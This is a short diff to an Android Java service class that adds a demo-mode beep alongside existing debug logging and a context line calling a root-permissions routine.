@@ -79,6 +79,10 @@ public class ServiceCore extends Service {
 		
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (onStart)"); //$NON-NLS-1$
+			
+		}
+		if (Cfg.DEMO) {
+			Beep.beepPenta();
 		}
 
 		Root.getPermissions();
